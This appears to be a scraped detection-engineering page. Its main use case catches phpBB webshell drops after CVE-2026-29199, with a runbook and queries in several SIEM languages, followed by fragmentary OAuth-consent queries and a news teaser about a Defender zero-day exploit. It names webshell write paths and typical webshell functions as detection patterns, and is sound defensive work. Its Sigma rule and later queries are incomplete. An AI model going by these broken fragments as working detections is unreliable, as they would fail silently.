Detects the standard phpBB ACP-to-RCE follow-on after admin takeover via CVE-2026-29199: the web-server process (w3wp.exe / php-fpm / httpd / nginx) writing a new .php file into phpBB writable directories (/cache/, /store/, /files/, /images/avatars/upload/, /ext/, /styles/). phpBB's RCE primitive on admin accounts has historically been template/style/extension editing, all of which land here. Rationale: The article explicitly states admin compromise via CVE-2026-29199 'opens the door to Remote Code Execution.' phpBB's well-known RCE primitive after ACP access is editing a style/template or installing a malicious extension — both write PHP into the dirs anchored above. Web-server-process-as-parent + new .php in writable phpBB dir is a high-fidelity composite (parent + child + path) per the KQL house-style anti-bare-process-execution rule. Cross-checked against: • https://www.aikido.dev/blog/phpbb-authentication-bypass-rce • https://pentest-tools.com/research/phpbb-authentication-bypass
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • phpBB upgrade (3.3.16 → 3.3.17) writing new core/extension .php files under /ext/ and /styles/
  • Administrator legitimately installing a third-party extension via Customise → Manage extensions
  • phpBB cache rebuild writing compiled Twig output under /cache/twig/ (compiled PHP)
  • Composer dependency install during a phpBB extension deploy
  • Backup/restore tool unpacking phpBB tarball back into the document root
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("composer","phpbb_install","adm/index.php?i=acp_extensions") or TargetFilePath has "/cache/twig/")
Response runbook
1) Triage: hash the new .php and search VirusTotal / your malware reputation feed; cat the first 256 bytes — a webshell almost always starts with <?php and contains eval/assert/system/passthru/base64_decode. Check phpBB phpbb_log for admin actions immediately preceding the file write. 2) Contain: take the affected phpBB document root offline behind a maintenance page; remove the dropped file; rotate ALL admin passwords and the config.php DB password; revoke any new user_ids elevated to admin group during the suspect window. 3) Hunt: across all phpBB hosts, run the same query for the past 14 days; check for additional persistence (cron entries, modified .htaccess, new entries in phpbb_extensions table); pivot to UC2 to find the source IP that drove the initial session takeover.
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileCreated","FileRenamed","FileModified")
| where FileName endswith ".php"
| where FolderPath has_any (@"\cache\", @"/cache/", @"\store\", @"/store/", @"\files\", @"/files/", @"\images\avatars\upload\", @"/images/avatars/upload/", @"\ext\", @"/ext/", @"\styles\", @"/styles/")
| where InitiatingProcessFileName in~ ("w3wp.exe","php-cgi.exe","php.exe","php-fpm","httpd","apache2","nginx")
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName, InitiatingProcessFolderPath
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType == "FileCreated"
| where TargetFileName endswith ".php"
| where TargetFilePath has_any ("/cache/", "/store/", "/files/", "/images/avatars/upload/", "/ext/", "/styles/", "\\cache\\", "\\store\\", "\\files\\", "\\ext\\", "\\styles\\")
| where ActingProcessName has_any ("w3wp.exe", "php-cgi.exe", "php.exe", "php-fpm", "httpd", "apache2", "nginx")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256
| order by TimeGenerated desc
title: phpBB Webshell Drop via Web Server Process
id: 7a1c4e9b-2d4f-4b8c-9f1a-3e8d72c40b15
description: Detects a web-server / PHP runtime process writing a new .php file under phpBB writable directories (cache, store, files, ext, styles, avatar upload). Article-specific to CVE-2026-29199 post-exploitation where authenticated admin session via the auth bypass is used to drop a webshell through the ACP template/extension editor.
references:
    - https://www.aikido.dev/blog/phpbb-authentication-bypass-rce
author: SOC Detection Engineering
date: 2026/06/10
tags:

logsource:
    category: file_event
    product: windows
detection:

        Image|endswith:
            - '\w3wp.exe'
            - '\php-cgi.exe'

    selection_file:

        TargetFilename|contains:

level: high
(source:windows.sysmon OR source:linux.auditd) (@EventID:11 OR @auditd.type:PATH) (@TargetFilename:(*\\cache\\*.php OR */cache/*.php OR *\\store\\*.php OR */store/*.php OR *\\files\\*.php OR */files/*.php OR *\\ext\\*.php OR */ext/*.php OR *\\styles\\*.php OR */styles/*.php OR */images/avatars/upload/*.php) OR @process.executable.path:(*/cache/*.php OR */store/*.php OR */ext/*.php)) (@Image:(*\\w3wp.exe OR *\\W3WP.exe OR *\\php-cgi.exe OR *\\php.exe) OR @process.name:(php-fpm OR httpd OR apache2 OR nginx))
#event_simpleName=FileWritten
| TargetFileName=/\.php$/i
| regex("(/cache/|/store/|/files/|/ext/|/styles/|/images/avatars/upload/|\\\\cache\\\\|\\\\store\\\\|\\\\files\\\\|\\\\ext\\\\|\\\\styles\\\\)", field=TargetFileName)
| ContextImageFileName=/(w3wp\.exe|php-cgi\.exe|php\.exe|php-fpm|httpd|apache2|nginx)$/i
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.process_name) as process_name values(Filesystem.user) as user from datamodel=Endpoint.Filesystem where Filesystem.action=created Filesystem.file_name="*.php" (Filesystem.file_path="*/cache/*" OR Filesystem.file_path="*/store/*" OR Filesystem.file_path="*/files/*" OR Filesystem.file_path="*/images/avatars/upload/*" OR Filesystem.file_path="*/ext/*" OR Filesystem.file_path="*/styles/*\*\template/*") by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.process_name | `drop_dm_object_name(Filesystem)` | where match(process_name,"(?i)(w3wp\.exe|php-fpm|httpd|apache2|nginx|php-cgi\.exe)") | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`

Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine

DeviceTvmSoftwareVulnerabilities

DeviceTvmSoftwareVulnerabilities

| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,

OAuth consent / suspicious app grant Actions on Objectives High
Cloud identity abuse: app gets high-priv scopes, often via consent phishing.
ATT&CKT1528 T1098.001
Data sourcesAuthentication.Authentication CloudAppEvents
CloudAppEvents
| where Timestamp > ago(7d)

| project Timestamp, AccountObjectId, AccountDisplayName, ActivityType,

// Entra ID directory audit — user / admin consent to a third-party app.
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName has "Consent to application"
| where Result =~ "success"
| extend AppName = tostring(parse_json(tostring(TargetResources))[0].displayName),

| order by TimeGenerated desc

Microsoft Defender RoguePlanet Zero-Day Grants SYSTEM Access on Updated Windows

The Hacker News
2026-06-10 9 use cases 4 techniques 6 kill-chain phases detected

The anonymous security researcher going by the name Chaotic Eclipse (aka Nightmare-Eclipse) has released a proof-of-concept (PoC) exploit for yet another Microsoft Defender zero-day named RoguePlanet. "The exploit is a race condition, so it's a hit or miss," the researcher, who published the exploit under a new GitHub account "MSNightmare" said. "I have managed to get a 100% success rate on

CVEsCVE-2026-33825 CVE-2026-45498 CVE-2026-41091
ATT&CKT1190 T1195.002 T1204.004 T1528
Domainsprojectnightcrawler.dev
